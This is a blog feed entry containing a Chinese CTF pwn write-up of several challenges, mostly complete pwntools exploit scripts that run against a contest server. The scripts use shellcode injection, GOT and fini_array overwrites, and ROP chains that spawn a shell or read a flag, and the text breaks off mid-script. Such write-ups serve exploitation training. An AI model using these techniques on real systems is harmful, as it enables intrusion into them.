    <link href="https://nocbtm.github.io/2020/05/25/BJDCTF-pwn-writeup/"/>
    <id>https://nocbtm.github.io/2020/05/25/BJDCTF-pwn-writeup/</id>
    <published>2020-05-25T02:24:25.000Z</published>
    <updated>2020-05-25T03:56:16.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="盲打1-盲打2"><a href="#盲打1-盲打2" class="headerlink" title="盲打1 盲打2"></a>盲打1 盲打2</h2><p>都是一个c语言解释器，但是不能用<code>()</code>来写c语言，也就是不能调用函数，可以用shellcode的方式来写 orw flag,</p><p>原理参考<a href="https://nocbtm.github.io/2020/05/08/对hello-world的重新认识/">对hello world的重新认识</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">ip, port = <span class="string">'183.129.189.60'</span>,<span class="number">10002</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">orw = asm(shellcraft.open("/home/ctf/flag", 0))</span></span><br><span class="line"><span class="string">orw += asm(shellcraft.read(3, "rsp", 0x20))</span></span><br><span class="line"><span class="string">orw += asm(shellcraft.write(1, "rsp", 0x20))</span></span><br><span class="line"><span class="string">orw += asm(shellcraft.exit(0))</span></span><br><span class="line"><span class="string">print '\\x'+hex(ord(orw[0]))[2:]</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">orw2=asm(</span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        mov rax,0x2c2c2c2c2c2c       </span></span><br><span class="line"><span class="string">        mov rbx,0x4b4d404a034a  </span></span><br><span class="line"><span class="string">        xor rax, rbx</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        mov rax,0x2c2c2c35352c2c2c</span></span><br><span class="line"><span class="string">        mov rbx,0x584f035058434403    </span></span><br><span class="line"><span class="string">        xor rax,rbx</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        mov rdi,rsp</span></span><br><span class="line"><span class="string">        mov esi,0x0</span></span><br><span class="line"><span class="string">        mov eax,0x2</span></span><br><span class="line"><span class="string">        xor ecx,ecx</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        mov rdi,rax</span></span><br><span class="line"><span class="string">        mov rsi,rsp</span></span><br><span class="line"><span class="string">        mov rdx,0x50</span></span><br><span class="line"><span class="string">        xor rax,rax</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        mov rdi,0x1</span></span><br><span class="line"><span class="string">        mov rax,0x1</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">    )</span><br><span class="line"><span class="keyword">print</span> <span class="string">'\\x'</span>+hex(ord(orw2[<span class="number">0</span>]))[<span class="number">2</span>:]</span><br><span class="line">payload=<span class="string">'const char main='</span>+str(hex(ord(orw2[<span class="number">0</span>])))+<span class="string">','</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(orw2)):</span><br><span class="line">    <span class="keyword">if</span> i != len(orw2)<span class="number">-1</span>:</span><br><span class="line">        payload+=<span class="string">'w'</span>+str(i)+<span class="string">'='</span>+str(hex(ord(orw2[i])))+<span class="string">','</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload+=<span class="string">'w'</span>+str(i)+<span class="string">'='</span>+str(hex(ord(orw2[i])))+<span class="string">';'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment">#shellcode=asm(shellcraft.sh())</span></span><br><span class="line">pause()</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">p.recvuntil(<span class="string">"(end with '@')"</span>)</span><br><span class="line">p.sendline(payload+<span class="string">'@'</span>)</span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line">p.can_recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Memory-Monster-I"><a href="#Memory-Monster-I" class="headerlink" title="Memory Monster I"></a>Memory Monster I</h2><p>任意地址写，故意栈溢出然后会调用<code>__stack_chk_fail</code>函数，修改<code>__stack_chk_fail</code>的got表为后门即可</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"Memory_Monster_I"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'183.129.189.60'</span>,<span class="number">10081</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='i386')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg(0x4011EB)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"addr:"</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(p64(<span class="number">0x404028</span>)+<span class="string">"\x00"</span>*<span class="number">0xc0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"data:"</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(p64(<span class="number">0x40124A</span>))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Memory-Monster-II"><a href="#Memory-Monster-II" class="headerlink" title="Memory Monster II"></a>Memory Monster II</h2><p>静态编译了,fini_array劫持为onegadget即可，onegadget苦苦找寻了好久，找到了一个有效的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"Memory_Monster_II"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'183.129.189.60'</span>,<span class="number">10102</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg(0x46F37F)</span></span><br><span class="line">dbg(<span class="number">0x4B80B8</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"addr:"</span>)</span><br><span class="line"></span><br><span class="line">p.send(p64(<span class="number">0x4B80B0</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"data:"</span>)</span><br><span class="line"></span><br><span class="line">p.send(p64(<span class="number">0x46F37F</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>另一种做法参考<a href="https://fmyy.pro/2020/05/23/Competition/DASCTF-May/" target="_blank" rel="noopener">fmmy</a>师傅题解</p><p>fini_array劫持</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fini_array[0]:__libc_csu_fini</span><br><span class="line">fini_array[1]:main函数地址</span><br></pre></td></tr></table></figure><p>之后则可以形成一个循环链,然后任意地址写,可以在fini_array[2]之后构建ROP链,最后再将fini_array[0]改成leave_ret,fini_array[1]改成ret执行后续ROP链</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = process(<span class="string">'./main'</span>)</span><br><span class="line">p = remote(<span class="string">'183.129.189.60'</span>,<span class="number">10100</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">m</span><span class="params">(address,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'addr:'</span>,p64(address))</span><br><span class="line">p.sendafter(<span class="string">'data:'</span>,content)</span><br><span class="line"></span><br><span class="line">m(<span class="number">0x4B80B0</span>,p64(<span class="number">0x402CB0</span>) + p64(<span class="number">0x401C1D</span>))</span><br><span class="line">pop_rdx_rsi = <span class="number">0x44BAF9</span></span><br><span class="line">mov_rax_rdx = <span class="number">0x41B380</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x401746</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x448415</span></span><br><span class="line">syscall = <span class="number">0x46F745</span></span><br><span class="line">binsh = <span class="number">0x492895</span></span><br><span class="line">leave_ret = <span class="number">0x401CF3</span></span><br><span class="line">ret = <span class="number">0x401016</span></span><br><span class="line">m(<span class="number">0x4B80B0</span> + <span class="number">0x10</span>,p64(pop_rdx_rsi) + p64(<span class="number">59</span>) + p64(<span class="number">0</span>))</span><br><span class="line">m(<span class="number">0x4B80B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span>,p64(mov_rax_rdx) + p64(pop_rdi_ret) + p64(binsh))</span><br><span class="line">m(<span class="number">0x4B80B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span> + <span class="number">0x18</span>,p64(pop_rdx_ret) + p64(<span class="number">0</span>) + p64(syscall))</span><br><span class="line">m(<span class="number">0x4B80B0</span>,p64(leave_ret) + p64(ret))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Memory-Monster-III"><a href="#Memory-Monster-III" class="headerlink" title="Memory Monster III"></a>Memory Monster III</h2><p>这道题当时没有做出来，赛后参考taqini师傅博客，有学到了新的姿势</p><p><a href="http://taqini.space/2020/02/14/play-ROP-with-fini-array/#0x0-背景" target="_blank" rel="noopener">通过利用fini_array部署并启动ROP攻击</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"Memory_Monster_III"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port=<span class="string">'183.129.189.60'</span>,<span class="number">10008</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">m</span><span class="params">(address,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'addr:'</span>,p64(address))</span><br><span class="line">p.sendafter(<span class="string">'data:'</span>,content)</span><br><span class="line"></span><br><span class="line">m(<span class="number">0x4B50B0</span>,p64(<span class="number">0x402CA0</span>) + p64(<span class="number">0x401C1D</span>))</span><br><span class="line"></span><br><span class="line">pop_rdx_rsi = <span class="number">0x44AB09</span></span><br><span class="line">mov_rax_rdx = <span class="number">0x41AE80</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x401746</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x447635</span></span><br><span class="line">leave_ret = <span class="number">0x401CF3</span></span><br><span class="line">ret = <span class="number">0x401016</span></span><br><span class="line">mprotect = <span class="number">0x448420</span></span><br><span class="line">read = <span class="number">0x447620</span></span><br><span class="line"></span><br><span class="line">shell_a = <span class="number">0x4BC100</span></span><br><span class="line">shell = asm(shellcraft.sh())</span><br><span class="line">m(<span class="number">0x4B50B0</span> + <span class="number">0x10</span>,p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rdx_rsi))</span><br><span class="line">m(<span class="number">0x4B50B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span>,p64(<span class="number">0x200</span>) + p64(shell_a) + p64(read))</span><br><span class="line">m(<span class="number">0x4B50B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span> + <span class="number">0x18</span>,p64(pop_rdi_ret) + p64(shell_a <span class="number">-0x100</span>) + p64(pop_rdx_rsi))</span><br><span class="line">m(<span class="number">0x4B50B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span> + <span class="number">0x18</span> + <span class="number">0x18</span>,p64(<span class="number">7</span>) + p64(<span class="number">0x1000</span>) + p64(mprotect))</span><br><span class="line">m(<span class="number">0x4B50B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span> + <span class="number">0x18</span> + <span class="number">0x18</span> + <span class="number">0x18</span>,p64(shell_a))</span><br><span class="line">m(<span class="number">0x4B50B0</span>,p64(leave_ret) + p64(ret) + p64(pop_rdi_ret))</span><br><span class="line"></span><br><span class="line">p.sendline(shell)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="secret2"><a href="#secret2" class="headerlink" title="secret2"></a>secret2</h2><p>文件描述符最多有1024个，也就是说最多打开文件1024多次,就不能继续打开了,则随机值之后全是0,因此输入”\x00”字节就能通过memcmp检测，然后close(0)，memcpy栈溢出， 只能orw flag了，并且此题远程是2.30的。2.23本地调试的时候有点不同。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># --- auther nocbtm ---</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">pwn_name = <span class="string">"secret3"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'183.129.189.60'</span>,<span class="number">10056</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='i386')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'libc6_2.30-0ubuntu2_amd64.so'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cus_rop</span><span class="params">(gadget1,gadget2,func_got,rdi,rsi,rdx)</span>:</span></span><br><span class="line">    payload = p64(gadget1)</span><br><span class="line">    payload += p64(<span class="number">0</span>)         <span class="comment">#rbx=0</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)         <span class="comment">#rbp=1</span></span><br><span class="line">    payload += p64(func_got)  <span class="comment">#r12  call</span></span><br><span class="line">    payload += p64(rdi)       <span class="comment">#r13  rdx read size</span></span><br><span class="line">    payload += p64(rsi)       <span class="comment">#r14  rsi</span></span><br><span class="line">    payload += p64(rdx)       <span class="comment">#r15  edi read canshu</span></span><br><span class="line">    payload += p64(gadget2)</span><br><span class="line">    payload += <span class="string">'\x00'</span>*<span class="number">56</span>      <span class="comment">#tiao zheng zhan zhen</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg(0x401433)</span></span><br><span class="line">rdi=<span class="number">0x40161b</span></span><br><span class="line">ret=<span class="number">0x401016</span></span><br><span class="line">rsi_r15=<span class="number">0x401619</span></span><br><span class="line">bss=elf.bss()+<span class="number">0x300</span></span><br><span class="line">p.recvuntil(<span class="string">"name? ________________ #"</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>+p64(<span class="number">0x4021df</span>)</span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">0x4021df</span>)+p64(rsi_r15)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(elf.plt[<span class="string">"open"</span>])</span><br><span class="line">payload+=cus_rop(<span class="number">0x401612</span>,<span class="number">0x4015F8</span>,elf.got[<span class="string">'read'</span>],<span class="number">0</span>,bss,<span class="number">64</span>)</span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">1</span>)+p64(elf.plt[<span class="string">"write"</span>])</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1255</span>):</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    payload=<span class="string">"\x00"</span></span><br><span class="line">    p.recvuntil(<span class="string">"Secret: _____            #"</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">1254</span>:</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        